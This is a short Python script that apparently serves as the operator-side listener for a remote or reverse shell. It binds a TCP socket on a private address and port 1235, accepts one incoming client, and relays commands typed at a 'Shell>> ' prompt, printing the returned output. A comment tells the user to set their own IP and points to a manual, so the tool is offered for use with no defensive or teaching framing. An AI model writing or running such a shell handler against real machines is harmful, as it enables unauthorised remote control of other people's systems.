import socket
host= "192.168.18.170" #Change with your ip look manual there are some important info for running it
port=1235
server_socket=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
server_socket.bind((host,port))
try:
    print("Server is listining...")
    server_socket.listen(1)
    client_socket,address=server_socket.accept()
    print(f"Connected to {address}")
    def send(msg):
        client_socket.send(msg.encode('utf-8'))
    def recive():
        print(client_socket.recv(1024).decode('utf-8'))
    try:
        while True:
            message=input("Shell>> ")
            send(message)
            recive()
    except KeyboardInterrupt:
        print("Thanks!")
        server_socket.close()
        client_socket.close()
except KeyboardInterrupt:
    print("Soft quitting...")
    server_socket.close()